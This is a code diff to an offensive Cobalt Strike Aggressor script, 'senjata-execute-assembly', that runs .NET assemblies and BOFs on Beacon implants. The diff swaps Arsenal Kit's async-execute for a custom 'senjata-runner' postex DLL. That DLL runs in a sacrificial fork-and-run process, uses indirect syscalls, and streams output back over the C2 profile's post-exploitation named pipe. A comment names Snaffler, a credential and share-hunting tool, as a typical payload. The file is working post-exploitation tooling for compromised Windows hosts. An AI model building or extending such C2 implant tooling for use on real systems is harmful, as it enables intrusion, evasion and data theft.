@@ -30,48 +30,45 @@ sub _strip_outer_quotes {
     return $s;
 }
 
-# Locate async-execute.x64.dll.
-# Checks (1) same directory as this CNA, then (2) Arsenal Kit canonical path.
-sub senjata_find_async_dll {
+# Locate senjata-runner.x64.dll.
+# Checks (1) same directory as this CNA (dist/ when CNA was copied there),
+# then (2) repo dist/ relative to the source CNA location.
+sub senjata_find_runner_dll {
     local('$path $dir');
 
-    $path = script_resource("async-execute.x64.dll");
+    $path = script_resource("senjata-runner.x64.dll");
     if (-isFile $path) { return $path; }
 
-    # Arsenal Kit at repo root: CNA lives 3 levels deep (bofs/senjata.../aggressor/)
+    # Source-tree path: CNA lives 3 levels deep (bofs/senjata.../aggressor/)
     $dir  = script_resource(".");
-    $path = $dir . "/../../../arsenal-kit/kits/postex/artifacts/async-execute/async-execute.x64.dll";
+    $path = $dir . "/../../../dist/senjata-runner.x64.dll";
     if (-isFile $path) { return $path; }
 
     return $null;
 }
 
-# Run the BOF via Arsenal Kit async-execute (single-shot; fork/run or inject).
-# $1=bid  $2=pid ("-1" = fork/run)  $3=raw .o bytes  $4=pre-packed bofArgs
-# Returns 1 on success, 0 on failure (caller falls back to beacon_inline_execute).
-sub senjata_run_async {
-    local('$bid $pid $bof $bofArgs $dll_path $dll_data $handle');
+# Run senjata-runner postex DLL (sacrificial fork-and-run; live streaming).
+# $1=bid  $2=pre-packed bofArgs
+# Returns 1 on success, 0 on failure.
+sub senjata_run_sacrificial {
+    local('$bid $bofArgs $dll_path $dll_data $handle');
     local('$profile $alloc_type $thread_start $output_pipe $pipe_name');
-    local('$bof_extracted $bof_stripped $arg_block $bof_with_args $packed_arguments');
-    local('$callback %bof_alloc_map @hint_parts');
+    local('$packed_arguments $callback %bof_alloc_map @hint_parts');
 
     $bid     = $1;
-    $pid     = $2;
-    $bof     = $3;
-    $bofArgs = $4;
+    $bofArgs = $2;
 
     # Locate and load the postex DLL
-    $dll_path = senjata_find_async_dll();
+    $dll_path = senjata_find_runner_dll();
     if ($dll_path is $null) {
-        berror($bid, "[-] async-execute.x64.dll not found; place it next to " .
-               "senjata-execute-assembly.cna or in arsenal-kit/kits/postex/artifacts/async-execute/");
+        berror($bid, "[-] senjata-runner.x64.dll not found. Build with: cargo make build");
         return 0;
     }
     $handle   = openf($dll_path);
     $dll_data = readb($handle, -1);
     closef($handle);
     if (strlen($dll_data) < 1) {
-        berror($bid, "[-] async-execute.x64.dll is empty or unreadable");
+        berror($bid, "[-] senjata-runner.x64.dll is empty or unreadable");
         return 0;
     }
 
@@ -100,7 +97,10 @@ sub senjata_run_async {
         }
     }
 
-    # Postex output pipe from C2 profile's post-ex.pipename
+    # Postex output pipe from C2 profile's post-ex.pipename.
+    # The runner inherits this pipe via CS's UDPK plumbing; the BeaconAPI
+    # function-table our postex DLL receives uses it transparently when
+    # the streamer thread calls BeaconOutput().
     $pipe_name = get_postex_pipe();
     if ($pipe_name is $null) {
         berror($bid, "[-] get_postex_pipe() failed; verify post-ex.pipename in C2 profile");
@@ -108,20 +108,12 @@ sub senjata_run_async {
     }
     $output_pipe = "\\\\\.\\pipe\\" . $pipe_name;
 
-    # Build BOF+args bundle:
-    #   bof_extract("go") appends 4 null bytes as terminator — strip them,
-    #   then append [arg_len: i][packed_args] where packed_args = bofArgs.
-    $bof_extracted = bof_extract($bof, "go");
-    $bof_stripped  = substr($bof_extracted, 0, strlen($bof_extracted) - 4);
-    $arg_block     = bof_pack($bid, "i", strlen($bofArgs)) . $bofArgs;
-    $bof_with_args = $bof_stripped . $arg_block;
-
-    # Single-shot postex DLL wire format (first-run):
-    # [int single_shot=1][int alloc_type][int syscall=1 (indirect)][z thread_start][z pipe][b bof_with_args]
+    # senjata-runner wire format (UDPK first-run args):
+    # [int single_shot=1][int alloc_type][int syscall=1 (indirect)][z thread_start][z pipe][b bofArgs]
+    # The `b` field is the raw orchestrator args; senjata-runner's postex_main
+    # skips the 176-byte BeaconAPI table prefix CS prepends and parses bofArgs directly.
     $packed_arguments = bof_pack($bid, "iiizzb",
-        1, $alloc_type, 1, $thread_start, $output_pipe, $bof_with_args);
-
-    if ($pid eq "-1") { $pid = $null; }
+        1, $alloc_type, 1, $thread_start, $output_pipe, $bofArgs);
 
     $callback = lambda({
         local('$bid $result %info $type');
@@ -137,7 +129,8 @@ sub senjata_run_async {
         }
     });
 
-    beacon_execute_postex_job($bid, $pid, $dll_data, $packed_arguments, $callback);
+    # $null pid = fork-and-run (CS spawns sacrificial via spawnto_x64).
+    beacon_execute_postex_job($bid, $null, $dll_data, $packed_arguments, $callback);
     # 2-hour timeout — long-running tools like Snaffler can run for tens of minutes
     bread_pipe($bid, "ANONYMOUS_BYTESTREAM", "CALLBACK_POSTEX_KIT",
         "senjata-execute-assembly", $output_pipe, 0, 7200000, $null);
@@ -360,18 +353,19 @@ alias senjata-execute-assembly {
         $mode, $mainName, $payload);
 
     if ($_dotNetDir ne "") {
-        btask($bid, "Running senjata-execute-assembly" . iff($_async, " [async pid=" . $_asyncPid . "]", "") . " (dir=".$_dotNetDir.", main=".$mainName.", ".size(@entries)." files)");
+        btask($bid, "Running senjata-execute-assembly" . iff($_inline, " [inline]", " [sacrificial]") . " (dir=".$_dotNetDir.", main=".$mainName.", ".size(@entries)." files)");
     } else {
-        btask($bid, "Running senjata-execute-assembly" . iff($_async, " [async pid=" . $_asyncPid . "]", "") . " (".$_dotNetAssembly.")");
+        btask($bid, "Running senjata-execute-assembly" . iff($_inline, " [inline]", " [sacrificial]") . " (".$_dotNetAssembly.")");
     }
 
-    if ($_async) {
-        if (!senjata_run_async($bid, $_asyncPid, $bof, $bofArgs)) {
-            berror($bid, "[-] async dispatch failed; falling back to inline execution");
-            beacon_inline_execute($bid, $bof, "go", $bofArgs);
-        }
-    } else {
+    if ($_inline) {
+        # Inline mode: BOF runs inside Beacon. Use only for trusted, light tools.
         beacon_inline_execute($bid, $bof, "go", $bofArgs);
+    } else {
+        # Default: postex DLL inside sacrificial process. Live-streams output.
+        if (!senjata_run_sacrificial($bid, $bofArgs)) {
+            berror($bid, "[-] sacrificial dispatch failed. Inspect dist/senjata-runner.x64.dll and Malleable C2 post-ex.pipename setting.");
+        }
     }
 
     clear(@_dotNetAssemblyArgs);
